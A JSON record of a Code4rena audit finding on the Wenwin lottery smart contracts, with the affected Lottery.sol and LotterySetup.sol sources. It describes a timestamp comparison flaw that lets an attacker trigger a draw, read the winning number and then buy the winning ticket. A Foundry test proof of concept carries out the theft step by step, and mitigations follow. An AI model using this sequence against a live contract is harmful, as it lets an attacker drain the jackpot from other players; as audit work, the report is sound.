{
  "Title": "[M-04] Possibility to steal jackpot bypassing restrictions in the `executeDraw()`",
  "Content": "\n<https://github.com/code-423n4/2023-03-wenwin/blob/91b89482aaedf8b8feb73c771d11c257eed997e8/src/Lottery.sol#L135>\n\n<https://github.com/code-423n4/2023-03-wenwin/blob/91b89482aaedf8b8feb73c771d11c257eed997e8/src/LotterySetup.sol#L114>\n\n### Impact\n\nAttacker can run `executeDraw()` in `Lottery.sol`, receive random numbers and *then* buy tickets with known numbers in one block.\n\nHarm: Jackpot\n\n### Proof of Concept\n\nThis vulnerability is possible to use when contract has been deployed with COOL_DOWN_PERIOD = 0;\n\nThe `executeDraw()` is allowed to be called at the last second of draw due to an incorrect comparison `block.timestamp` with `drawScheduledAt(currentDraw)`, which is start of draw.\n\n        function executeDraw() external override whenNotExecutingDraw {\n            // slither-disable-next-line timestamp\n            if (block.timestamp < drawScheduledAt(currentDraw)) { //@dingo should be <= here\n                revert ExecutingDrawTooEarly();\n            }\n            returnUnclaimedJackpotToThePot();\n            drawExecutionInProgress = true;\n            requestRandomNumber();\n            emit StartedExecutingDraw(currentDraw);\n        }\n\nAlso modifier in LotterySetup.sol allows same action:\n\n        modifier beforeTicketRegistrationDeadline(uint128 drawId) {\n            // slither-disable-next-line timestamp\n            if (block.timestamp > ticketRegistrationDeadline(drawId)) { //@dingo should be >= here\n                revert TicketRegistrationClosed(drawId);\n            }\n            _;\n        }\n\nExploit:\n\nAttacker is waiting for last second of `PERIOD` (between to draws).\n\nCall `executeDraw()`. It will affect a `requestRandomNumber()` and chainlink will return random number to `onRandomNumberFulfilled()` at `RNSourceController.sol`.\n\nAttacker now could read received RandomNumber:\n\n\n\n       uint256 winningTicketTemp = lot.winningTicket(0);\n\nAttacker buys new ticket with randomNumber:\n\n<!---->\n\n       uint128[] memory drawId2 = new uint128[](1);\n       drawId2[0] = 0;\n       uint120[] memory winningArray = new uint120[](1);\n       winningArray[0] = uint120(winningTicketTemp); \n\n       lot.buyTickets(drawId2, winningArray, address(0), address(0));\n\nClaim winnings:\n\n       uint256[] memory ticketID = new uint256[](1);\n       ticketID[0] = 1;\n       lot.claimWinningTickets(ticketID);\n\nExploit code:\n\n```\n// SPDX-License-Identifier: UNLICENSED\npragma solidity ^0.8.13;\n\nimport \"./LotteryTestBase.sol\";\nimport \"../src/Lottery.sol\";\nimport \"./TestToken.sol\";\nimport \"test/TestHelpers.sol\";\n\ncontract LotteryTestCustom is LotteryTestBase {\n  address public eoa = address(1234);\n  address public attacker = address(1235);\n\n  function testExploit() public {\n    vm.warp(0);\n    Lottery lot = new Lottery(\n      LotterySetupParams(\n        rewardToken,\n        LotteryDrawSchedule(2 * PERIOD, PERIOD, COOL_DOWN_PERIOD),\n        TICKET_PRICE,\n        SELECTION_SIZE,\n        SELECTION_MAX,\n        EXPECTED_PAYOUT,\n        fixedRewards\n      ),\n      playerRewardFirstDraw,\n      playerRewardDecrease,\n      rewardsToReferrersPerDraw,\n      MAX_RN_FAILED_ATTEMPTS,\n      MAX_RN_REQUEST_DELAY\n    );\n\n    lot.initSource(IRNSource(randomNumberSource));\n\n    vm.startPrank(eoa);\n    rewardToken.mint(1000 ether);\n    rewardToken.approve(address(lot), 100 ether);\n    rewardToken.transfer(address(lot), 100 ether);\n    vm.warp(60 * 60 * 24 + 1);\n    lot.finalizeInitialPotRaise();\n\n    uint128[] memory drawId = new uint128[](1);\n    drawId[0] = 0;\n    uint120[] memory ticketsDigits = new uint120[](1);\n    ticketsDigits[0] = uint120(0x0F); //1,2,3,4 numbers choosed;\n\n    ///@dev Origin user buying ticket.\n    lot.buyTickets(drawId, ticketsDigits, address(0), address(0));\n    vm.stopPrank();\n\n    //====start of attack====\n    vm.startPrank(attacker);\n    rewardToken.mint(1000 ether);\n    rewardToken.approve(address(lot), 100 ether);\n\n    console.log(\"attacker balance before buying ticket:               \", rewardToken.balanceOf(attacker));\n\n    vm.warp(172800); //Attacker is waiting for deadline of draw period, than he could call executeDraw();\n    lot.executeDraw(); //Due to the lack of condition check in executeDraw(`<` should be `<=`). Also call was sent to chainlink.\n    uint256 randomNumber = 0x00;\n    vm.stopPrank();\n\n    vm.prank(address(randomNumberSource));\n    lot.onRandomNumberFulfilled(randomNumber); //chainLink push here randomNumber;\n    uint256 winningTicketTemp = lot.winningTicket(0); //random number from chainlink stores here.\n    console.log(\"Winning ticket number is:                            \", winningTicketTemp);\n\n    vm.startPrank(attacker);\n    uint128[] memory drawId2 = new uint128[](1);\n    drawId2[0] = 0;\n    uint120[] memory winningArray = new uint120[](1);\n    winningArray[0] = uint120(winningTicketTemp); //@audit we will buy ticket with stealed random number below;\n\n    lot.buyTickets(drawId2, winningArray, address(0), address(0)); //attacker can buy ticket with stealed random number.\n\n    uint256[] memory ticketID = new uint256[](1);\n    ticketID[0] = 1;\n    lot.claimWinningTickets(ticketID); //attacker claims winninngs.\n    vm.stopPrank();\n\n    console.log(\"attacker balance after all:                          \", rewardToken.balanceOf(attacker));\n  }\n\n  function reconstructTicket(\n    uint256 randomNumber,\n    uint8 selectionSize,\n    uint8 selectionMax\n  ) internal pure returns (uint120 ticket) {\n    /// Ticket must contain unique numbers, so we are using smaller selection count in each iteration\n    /// It basically means that, once `x` numbers are selected our choice is smaller for `x` numbers\n    uint8[] memory numbers = new uint8[](selectionSize);\n    uint256 currentSelectionCount = uint256(selectionMax);\n\n    for (uint256 i = 0; i < selectionSize; ++i) {\n      numbers[i] = uint8(randomNumber % currentSelectionCount);\n      randomNumber /= currentSelectionCount;\n      currentSelectionCount--;\n    }\n\n    bool[] memory selected = new bool[](selectionMax);\n\n    for (uint256 i = 0; i < selectionSize; ++i) {\n      uint8 currentNumber = numbers[i];\n      // check current selection for numbers smaller than current and increase if needed\n      for (uint256 j = 0; j <= currentNumber; ++j) {\n        if (selected[j]) {\n          currentNumber++;\n        }\n      }\n      selected[currentNumber] = true;\n      ticket |= ((uint120(1) << currentNumber));\n    }\n  }\n}\n\n\n\n```\n\n### Tools Used\n\nVS Code\n\n### Recommended Mitigation Steps\n\n1.  Change `<` by `<=`:\n\n<!---->\n\n      function executeDraw() external override whenNotExecutingDraw {\n            // slither-disable-next-line timestamp\n            if (block.timestamp < drawScheduledAt(currentDraw)) { //@dingo should be <= here\n                revert ExecutingDrawTooEarly();\n            }\n            returnUnclaimedJackpotToThePot();\n            drawExecutionInProgress = true;\n            requestRandomNumber();\n            emit StartedExecutingDraw(currentDraw);\n        }\n\n2.  Change `>` by `>=`:\n\n```\n   modifier beforeTicketRegistrationDeadline(uint128 drawId) {\n        // slither-disable-next-line timestamp\n        if (block.timestamp > ticketRegistrationDeadline(drawId)) { //@dingo should be >= here\n            revert TicketRegistrationClosed(drawId);\n        }\n        _;\n    }\n\n```\n\n**[rand0c0des (Wenwin) confirmed](https://github.com/code-423n4/2023-03-wenwin-findings/issues/141)**\n\n**[cccz (judge) decreased severity to Medium](https://github.com/code-423n4/2023-03-wenwin-findings/issues/343)** \n\n\n***\n\n",
  "Impact": "MEDIUM",
  "Source": "https://code4rena.com/contests/2023-03-wenwin-contest",
  "Code": [
    {
      "filename": "src/Lottery.sol",
      "content": "// SPDX-License-Identifier: UNLICENSED\n// slither-disable-next-line solc-version\npragma solidity 0.8.19;\n\nimport \"@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol\";\nimport \"@openzeppelin/contracts/utils/math/Math.sol\";\nimport \"src/ReferralSystem.sol\";\nimport \"src/RNSourceController.sol\";\nimport \"src/staking/Staking.sol\";\nimport \"src/LotterySetup.sol\";\nimport \"src/TicketUtils.sol\";\n\n/// @dev Lottery contract\n/// It runs `selectionSize` / `selectionMax` type of lottery.\n/// User buys the ticket by selecting total of `selectionSize` numbers from [1, selectionMax] range.\n/// Ticket price is paid each time user buys a ticket.\n/// Part of the price is staking reward, which is claimable to `stakingRewardRecipient`.\n/// Part of the price is frontend reward which is claimable by frontend operators selling the ticket.\n/// All fees, as well as rewards are paid in `rewardToken`.\n/// All prizes are dynamic and dependant on the actual ticket sales.\ncontract Lottery is ILottery, Ticket, LotterySetup, ReferralSystem, RNSourceController {\n    using SafeERC20 for IERC20;\n    using TicketUtils for uint256;\n\n    uint256 private claimedStakingRewardAtTicketId;\n    mapping(address => uint256) private frontendDueTicketSales;\n    mapping(uint128 => mapping(uint120 => uint256)) private unclaimedCount;\n\n    address public immutable override stakingRewardRecipient;\n\n    uint256 public override lastDrawFinalTicketId;\n\n    bool public override drawExecutionInProgress;\n    uint128 public override currentDraw;\n\n    mapping(uint128 => uint120) public override winningTicket;\n    mapping(uint128 => mapping(uint8 => uint256)) public override winAmount;\n\n    mapping(uint128 => uint256) public override ticketsSold;\n    int256 public override currentNetProfit;\n\n    /// @dev Checks if ticket is a valid ticket, and reverts if invalid\n    /// @param ticket Ticket being checked\n    modifier requireValidTicket(uint256 ticket) {\n        if (!ticket.isValidTicket(selectionSize, selectionMax)) {\n            revert InvalidTicket();\n        }\n        _;\n    }\n\n    /// @dev Checks if we are not executing draw already.\n    modifier whenNotExecutingDraw() {\n        if (drawExecutionInProgress) {\n            revert DrawAlreadyInProgress();\n        }\n        _;\n    }\n\n    /// @dev Checks if draw is being executed right now.\n    modifier onlyWhenExecutingDraw() {\n        if (!drawExecutionInProgress) {\n            revert DrawNotInProgress();\n        }\n        _;\n    }\n\n    /// @dev Checks that ticket owner is caller of the function. Reverts if not called by ticket owner.\n    /// @param ticketId Ticket id we are checking owner for.\n    modifier onlyTicketOwner(uint256 ticketId) {\n        if (ownerOf(ticketId) != msg.sender) {\n            revert UnauthorizedClaim(ticketId, msg.sender);\n        }\n        _;\n    }\n\n    /// @dev Constructs a new lottery contract.\n    /// @param lotterySetupParams Setup parameter for the lottery.\n    /// @param playerRewardFirstDraw Rewards for players in native token for first draw.\n    /// @param playerRewardDecreasePerDraw Decrease of rewards for players per each draw.\n    /// @param rewardsToReferrersPerDraw Percentage of native token rewards going to players.\n    /// @param maxRNFailedAttempts Maximum number of consecutive failed attempts for random number source.\n    /// @param maxRNRequestDelay Time considered as maximum delay for RN request.\n    // solhint-disable-next-line code-complexity\n    constructor(\n        LotterySetupParams memory lotterySetupParams,\n        uint256 playerRewardFirstDraw,\n        uint256 playerRewardDecreasePerDraw,\n        uint256[] memory rewardsToReferrersPerDraw,\n        uint256 maxRNFailedAttempts,\n        uint256 maxRNRequestDelay\n    )\n        Ticket()\n        LotterySetup(lotterySetupParams)\n        ReferralSystem(playerRewardFirstDraw, playerRewardDecreasePerDraw, rewardsToReferrersPerDraw)\n        RNSourceController(maxRNFailedAttempts, maxRNRequestDelay)\n    {\n        stakingRewardRecipient = address(\n            new Staking(\n            this,\n            lotterySetupParams.token,\n            nativeToken,\n            \"Staked LOT\",\n            \"stLOT\"\n            )\n        );\n\n        nativeToken.safeTransfer(msg.sender, ILotteryToken(address(nativeToken)).INITIAL_SUPPLY());\n    }\n\n    function buyTickets(\n        uint128[] calldata drawIds,\n        uint120[] calldata tickets,\n        address frontend,\n        address referrer\n    )\n        external\n        override\n        requireJackpotInitialized\n        returns (uint256[] memory ticketIds)\n    {\n        if (drawIds.length != tickets.length) {\n            revert DrawsAndTicketsLenMismatch(drawIds.length, tickets.length);\n        }\n        ticketIds = new uint256[](tickets.length);\n        for (uint256 i = 0; i < drawIds.length; ++i) {\n            ticketIds[i] = registerTicket(drawIds[i], tickets[i], frontend, referrer);\n        }\n        referralRegisterTickets(currentDraw, referrer, msg.sender, tickets.length);\n        frontendDueTicketSales[frontend] += tickets.length;\n        rewardToken.safeTransferFrom(msg.sender, address(this), ticketPrice * tickets.length);\n    }\n\n    function executeDraw() external override whenNotExecutingDraw {\n        // slither-disable-next-line timestamp\n        if (block.timestamp < drawScheduledAt(currentDraw)) {\n            revert ExecutingDrawTooEarly();\n        }\n        returnUnclaimedJackpotToThePot();\n        drawExecutionInProgress = true;\n        requestRandomNumber();\n        emit StartedExecutingDraw(currentDraw);\n    }\n\n    function unclaimedRewards(LotteryRewardType rewardType) external view override returns (uint256 rewards) {\n        uint256 dueTicketsSold = (rewardType == LotteryRewardType.FRONTEND)\n            ? frontendDueTicketSales[msg.sender]\n            : nextTicketId - claimedStakingRewardAtTicketId;\n        rewards = LotteryMath.calculateRewards(ticketPrice, dueTicketsSold, rewardType);\n    }\n\n    function claimRewards(LotteryRewardType rewardType) external override returns (uint256 claimedAmount) {\n        address beneficiary = (rewardType == LotteryRewardType.FRONTEND) ? msg.sender : stakingRewardRecipient;\n        claimedAmount = LotteryMath.calculateRewards(ticketPrice, dueTicketsSoldAndReset(beneficiary), rewardType);\n\n        emit ClaimedRewards(beneficiary, claimedAmount, rewardType);\n        rewardToken.safeTransfer(beneficiary, claimedAmount);\n    }\n\n    function claimable(uint256 ticketId) external view override returns (uint256 claimableAmount, uint8 winTier) {\n        TicketInfo memory ticketInfo = ticketsInfo[ticketId];\n        if (!ticketInfo.claimed) {\n            uint120 _winningTicket = winningTicket[ticketInfo.drawId];\n            winTier = TicketUtils.ticketWinTier(ticketInfo.combination, _winningTicket, selectionSize, selectionMax);\n            if (block.timestamp <= ticketRegistrationDeadline(ticketInfo.drawId + LotteryMath.DRAWS_PER_YEAR)) {\n                claimableAmount = winAmount[ticketInfo.drawId][winTier];\n            }\n        }\n    }\n\n    function claimWinningTickets(uint256[] calldata ticketIds) external override returns (uint256 claimedAmount) {\n        uint256 totalTickets = ticketIds.length;\n        for (uint256 i = 0; i < totalTickets; ++i) {\n            claimedAmount += claimWinningTicket(ticketIds[i]);\n        }\n        rewardToken.safeTransfer(msg.sender, claimedAmount);\n    }\n\n    /// @dev Registers the ticket in the system. To be called when user is buying the ticket.\n    /// @param drawId Draw identifier ticket is bought for.\n    /// @param ticket Combination packed as uint120.\n    function registerTicket(\n        uint128 drawId,\n        uint120 ticket,\n        address frontend,\n        address referrer\n    )\n        private\n        beforeTicketRegistrationDeadline(drawId)\n        requireValidTicket(ticket)\n        returns (uint256 ticketId)\n    {\n        ticketId = mint(msg.sender, drawId, ticket);\n        unclaimedCount[drawId][ticket]++;\n        ticketsSold[drawId]++;\n        emit NewTicket(currentDraw, ticketId, drawId, msg.sender, ticket, frontend, referrer);\n    }\n\n    /// @dev Finalizes the draw after getting random number from source.\n    /// Calculates the winning ticket. Splits jackpot rewards if there are matching tickets.\n    /// Stores claimable amounts for each win tier and calculates net profit.\n    /// Triggers referral system's mint for current draw to split the incentives.\n    /// @param randomNumber The number that is received from source.\n    function receiveRandomNumber(uint256 randomNumber) internal override onlyWhenExecutingDraw {\n        uint120 _winningTicket = TicketUtils.reconstructTicket(randomNumber, selectionSize, selectionMax);\n        uint128 drawFinalized = currentDraw++;\n        uint256 jackpotWinners = unclaimedCount[drawFinalized][_winningTicket];\n\n        if (jackpotWinners > 0) {\n            winAmount[drawFinalized][selectionSize] = drawRewardSize(drawFinalized, selectionSize) / jackpotWinners;\n        } else {\n            for (uint8 winTier = 1; winTier < selectionSize; ++winTier) {\n                winAmount[drawFinalized][winTier] = drawRewardSize(drawFinalized, winTier);\n            }\n        }\n\n        currentNetProfit = LotteryMath.calculateNewProfit(\n            currentNetProfit,\n            ticketsSold[drawFinalized],\n            ticketPrice,\n            jackpotWinners > 0,\n            fixedReward(selectionSize),\n            expectedPayout\n        );\n        winningTicket[drawFinalized] = _winningTicket;\n        drawExecutionInProgress = false;\n\n        uint256 ticketsSoldDuringDraw = nextTicketId - lastDrawFinalTicketId;\n        lastDrawFinalTicketId = nextTicketId;\n        referralDrawFinalize(drawFinalized, ticketsSoldDuringDraw);\n\n        emit FinishedExecutingDraw(drawFinalized, randomNumber, _winningTicket);\n    }\n\n    function currentRewardSize(uint8 winTier) public view override returns (uint256 rewardSize) {\n        return drawRewardSize(currentDraw, winTier);\n    }\n\n    function drawRewardSize(uint128 drawId, uint8 winTier) private view returns (uint256 rewardSize) {\n        return LotteryMath.calculateReward(\n            currentNetProfit,\n            fixedReward(winTier),\n            fixedReward(selectionSize),\n            ticketsSold[drawId],\n            winTier == selectionSize,\n            expectedPayout\n        );\n    }\n\n    function dueTicketsSoldAndReset(address beneficiary) private returns (uint256 dueTickets) {\n        if (beneficiary == stakingRewardRecipient) {\n            dueTickets = nextTicketId - claimedStakingRewardAtTicketId;\n            claimedStakingRewardAtTicketId = nextTicketId;\n        } else {\n            dueTickets = frontendDueTicketSales[beneficiary];\n            frontendDueTicketSales[beneficiary] = 0;\n        }\n    }\n\n    function claimWinningTicket(uint256 ticketId) private onlyTicketOwner(ticketId) returns (uint256 claimedAmount) {\n        uint256 winTier;\n        (claimedAmount, winTier) = this.claimable(ticketId);\n        if (claimedAmount == 0) {\n            revert NothingToClaim(ticketId);\n        }\n\n        unclaimedCount[ticketsInfo[ticketId].drawId][ticketsInfo[ticketId].combination]--;\n        markAsClaimed(ticketId);\n        emit ClaimedTicket(msg.sender, ticketId, claimedAmount);\n    }\n\n    function returnUnclaimedJackpotToThePot() private {\n        if (currentDraw >= LotteryMath.DRAWS_PER_YEAR) {\n            uint128 drawId = currentDraw - LotteryMath.DRAWS_PER_YEAR;\n            uint256 unclaimedJackpotTickets = unclaimedCount[drawId][winningTicket[drawId]];\n            currentNetProfit += int256(unclaimedJackpotTickets * winAmount[drawId][selectionSize]);\n        }\n    }\n\n    function requireFinishedDraw(uint128 drawId) internal view override {\n        if (drawId >= currentDraw) {\n            revert DrawNotFinished(drawId);\n        }\n    }\n\n    function mintNativeTokens(address mintTo, uint256 amount) internal override {\n        ILotteryToken(address(nativeToken)).mint(mintTo, amount);\n    }\n}"
    },
    {
      "filename": "src/LotterySetup.sol",
      "content": "// SPDX-License-Identifier: UNLICENSED\n// slither-disable-next-line solc-version\npragma solidity 0.8.19;\n\nimport \"@openzeppelin/contracts/utils/math/Math.sol\";\nimport \"@openzeppelin/contracts/token/ERC20/extensions/IERC20Metadata.sol\";\nimport \"src/PercentageMath.sol\";\nimport \"src/LotteryToken.sol\";\nimport \"src/interfaces/ILotterySetup.sol\";\nimport \"src/Ticket.sol\";\n\ncontract LotterySetup is ILotterySetup {\n    using PercentageMath for uint256;\n\n    uint256 public immutable override minInitialPot;\n    uint256 public immutable override jackpotBound;\n\n    IERC20 public immutable override rewardToken;\n    IERC20 public immutable override nativeToken;\n\n    uint256 public immutable override ticketPrice;\n\n    uint256 public override initialPot;\n\n    uint256 public immutable override initialPotDeadline;\n    uint256 internal immutable firstDrawSchedule;\n    uint256 public immutable override drawPeriod;\n    uint256 public immutable override drawCoolDownPeriod;\n\n    uint8 public immutable override selectionSize;\n    uint8 public immutable override selectionMax;\n    uint256 public immutable override expectedPayout;\n\n    uint256 private immutable nonJackpotFixedRewards;\n\n    uint256 private constant BASE_JACKPOT_PERCENTAGE = 30_030; // 30.03%\n\n    /// @dev Constructs a new lottery contract\n    /// @param lotterySetupParams Setup parameter for the lottery\n    // solhint-disable-next-line code-complexity\n    constructor(LotterySetupParams memory lotterySetupParams) {\n        if (address(lotterySetupParams.token) == address(0)) {\n            revert RewardTokenZero();\n        }\n        if (lotterySetupParams.ticketPrice == uint256(0)) {\n            revert TicketPriceZero();\n        }\n        if (lotterySetupParams.selectionSize == 0) {\n            revert SelectionSizeZero();\n        }\n        if (lotterySetupParams.selectionMax >= 120) {\n            revert SelectionSizeMaxTooBig();\n        }\n        if (\n            lotterySetupParams.expectedPayout < lotterySetupParams.ticketPrice / 100\n                || lotterySetupParams.expectedPayout >= lotterySetupParams.ticketPrice\n        ) {\n            revert InvalidExpectedPayout();\n        }\n        if (\n            lotterySetupParams.selectionSize > 16 || lotterySetupParams.selectionSize >= lotterySetupParams.selectionMax\n        ) {\n            revert SelectionSizeTooBig();\n        }\n        if (\n            lotterySetupParams.drawSchedule.drawCoolDownPeriod >= lotterySetupParams.drawSchedule.drawPeriod\n                || lotterySetupParams.drawSchedule.firstDrawScheduledAt < lotterySetupParams.drawSchedule.drawPeriod\n        ) {\n            revert DrawPeriodInvalidSetup();\n        }\n        initialPotDeadline =\n            lotterySetupParams.drawSchedule.firstDrawScheduledAt - lotterySetupParams.drawSchedule.drawPeriod;\n        // slither-disable-next-line timestamp\n        if (initialPotDeadline < (block.timestamp + lotterySetupParams.drawSchedule.drawPeriod)) {\n            revert InitialPotPeriodTooShort();\n        }\n\n        nativeToken = new LotteryToken();\n        uint256 tokenUnit = 10 ** IERC20Metadata(address(lotterySetupParams.token)).decimals();\n        minInitialPot = 4 * tokenUnit;\n        jackpotBound = 2_000_000 * tokenUnit;\n        rewardToken = lotterySetupParams.token;\n        firstDrawSchedule = lotterySetupParams.drawSchedule.firstDrawScheduledAt;\n        drawPeriod = lotterySetupParams.drawSchedule.drawPeriod;\n        drawCoolDownPeriod = lotterySetupParams.drawSchedule.drawCoolDownPeriod;\n        ticketPrice = lotterySetupParams.ticketPrice;\n        selectionSize = lotterySetupParams.selectionSize;\n        selectionMax = lotterySetupParams.selectionMax;\n        expectedPayout = lotterySetupParams.expectedPayout;\n\n        nonJackpotFixedRewards = packFixedRewards(lotterySetupParams.fixedRewards);\n\n        emit LotteryDeployed(\n            lotterySetupParams.token,\n            lotterySetupParams.drawSchedule,\n            lotterySetupParams.ticketPrice,\n            lotterySetupParams.selectionSize,\n            lotterySetupParams.selectionMax,\n            lotterySetupParams.expectedPayout,\n            lotterySetupParams.fixedRewards\n        );\n    }\n\n    modifier requireJackpotInitialized() {\n        // slither-disable-next-line incorrect-equality\n        if (initialPot == 0) {\n            revert JackpotNotInitialized();\n        }\n        _;\n    }\n\n    modifier beforeTicketRegistrationDeadline(uint128 drawId) {\n        // slither-disable-next-line timestamp\n        if (block.timestamp > ticketRegistrationDeadline(drawId)) {\n            revert TicketRegistrationClosed(drawId);\n        }\n        _;\n    }\n\n    function fixedReward(uint8 winTier) public view override returns (uint256 amount) {\n        if (winTier == selectionSize) {\n            return _baseJackpot(initialPot);\n        } else if (winTier == 0 || winTier > selectionSize) {\n            return 0;\n        } else {\n            uint256 mask = uint256(type(uint16).max) << (winTier * 16);\n            uint256 extracted = (nonJackpotFixedRewards & mask) >> (winTier * 16);\n            return extracted * (10 ** (IERC20Metadata(address(rewardToken)).decimals() - 1));\n        }\n    }\n\n    function finalizeInitialPotRaise() external override {\n        if (initialPot > 0) {\n            revert JackpotAlreadyInitialized();\n        }\n        // slither-disable-next-line timestamp\n        if (block.timestamp <= initialPotDeadline) {\n            revert FinalizingInitialPotBeforeDeadline();\n        }\n        uint256 raised = rewardToken.balanceOf(address(this));\n        if (raised < minInitialPot) {\n            revert RaisedInsufficientFunds(raised);\n        }\n        initialPot = raised;\n\n        // must hold after this call, this will be used as a check that jackpot is initialized\n        assert(initialPot > 0);\n\n        emit InitialPotPeriodFinalized(raised);\n    }\n\n    function drawScheduledAt(uint128 drawId) public view override returns (uint256 time) {\n        time = firstDrawSchedule + (drawId * drawPeriod);\n    }\n\n    function ticketRegistrationDeadline(uint128 drawId) public view override returns (uint256 time) {\n        time = drawScheduledAt(drawId) - drawCoolDownPeriod;\n    }\n\n    function _baseJackpot(uint256 _initialPot) internal view returns (uint256) {\n        return Math.min(_initialPot.getPercentage(BASE_JACKPOT_PERCENTAGE), jackpotBound);\n    }\n\n    function packFixedRewards(uint256[] memory rewards) private view returns (uint256 packed) {\n        if (rewards.length != (selectionSize) || rewards[0] != 0) {\n            revert InvalidFixedRewardSetup();\n        }\n        uint256 divisor = 10 ** (IERC20Metadata(address(rewardToken)).decimals() - 1);\n        for (uint8 winTier = 1; winTier < selectionSize; ++winTier) {\n            uint16 reward = uint16(rewards[winTier] / divisor);\n            if ((rewards[winTier] % divisor) != 0) {\n                revert InvalidFixedRewardSetup();\n            }\n            packed |= uint256(reward) << (winTier * 16);\n        }\n    }\n}"
    }
  ]
}